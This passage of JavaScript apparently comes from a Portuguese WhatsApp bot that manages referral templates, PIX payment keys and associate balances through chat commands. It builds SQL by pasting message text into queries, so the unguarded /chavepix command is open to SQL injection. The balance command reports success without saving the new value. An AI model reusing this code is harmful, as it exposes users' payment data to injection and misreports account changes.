                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/textomodeloasso1===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                TEXTO_MODELO_DIVUL_ASSOCIADO1 = msg[1]
                TEXTO_MODELO_DIVUL_ASSOCIADO1 = TEXTO_MODELO_DIVUL_ASSOCIADO1.replace(/\'/igm, "")
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${TEXTO_MODELO_DIVUL_ASSOCIADO1}' WHERE PARAMETRO = 'TEXTO_MODELO_DIVUL_ASSOCIADO1'`).run()

                Texto = `*TEXTO MODELO DE DIVULGAÇÃO ASSOCIDADO 1 ALTERADO COM SUCESSO!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/textomodeloasso2===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                TEXTO_MODELO_DIVUL_ASSOCIADO2 = msg[1]
                TEXTO_MODELO_DIVUL_ASSOCIADO2 = TEXTO_MODELO_DIVUL_ASSOCIADO2.replace(/\'/igm, "")
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${TEXTO_MODELO_DIVUL_ASSOCIADO2}' WHERE PARAMETRO = 'TEXTO_MODELO_DIVUL_ASSOCIADO2'`).run()

                Texto = `*TEXTO MODELO DE DIVULGAÇÃO ASSOCIDADO 2 ALTERADO COM SUCESSO!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/chavepix===") > -1) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                CHAVEPIX_INDICADO_Ant = await DataBase_Better.prepare(`SELECT CHAVEPIX_INDICADO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["CHAVEPIX_INDICADO"]
                CHAVEPIX_INDICADO = msg[1]

                await DataBase_Better.prepare(`UPDATE CONTATOS SET CHAVEPIX_INDICADO = '${CHAVEPIX_INDICADO}' WHERE ID_CONTATO = '${Mensagem_From}'`).run()

                Texto = `*CHAVE PIX ALTERADA COM SUCESSO!*

*CHAVE PIX ANTERIOR:* ${CHAVEPIX_INDICADO_Ant}

*CHAVE PIX ATUAL:* ${CHAVEPIX_INDICADO}
`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/definirsaldoasso===") > -1 && Adms.includes(Numero)) {
            try {
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
                msg = Mensagem_Texto.split("===")

                if (msg[1] === "" || Array_Total_Igual.length != 6) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                USUARIO = msg[1]

                SALDO_INDICACAO = await DataBase_Better.prepare(`SELECT SALDO_INDICACAO FROM CONTATOS WHERE ID_CONTATO = '${USUARIO}@c.us'`).get()["SALDO_INDICACAO"]
                SALDO_INDICACAO = parseFloat(SALDO_INDICACAO).toFixed(2);

                NOVO_SALDO_INDICACAO = msg[2]
                NOVO_SALDO_INDICACAO = parseFloat(NOVO_SALDO_INDICACAO).toFixed(2);
                Texto = `*SALDO DO ASSOCIADO ALTERADO COM SUCESSO!*

*ASSOCIADO:* ${USUARIO}
*SALDO ANTERIOR:* ${SALDO_INDICACAO}
*SALDO ATUAL:* ${NOVO_SALDO_INDICACAO}
`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/assopixoucompra===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            if (msg[1] === "1") {
                Texto = `*AGORA OS ASSOCIADOS GANHAM PERCENTUAL POR PIXs INSERIDOS PELOS INDICADOS!*`
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '1' WHERE PARAMETRO = 'PIX_OU_COMPRA'`).run()
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else if (msg[1] === "2") {
                Texto = `*AGORA OS ASSOCIADOS GANHAM PERCENTUAL EM CIMA DAS COMPRAS DOS INDICADOS!*`
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '2' WHERE PARAMETRO = 'PIX_OU_COMPRA'`).run()
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else {
                Texto = `Comando inválido!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳



        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
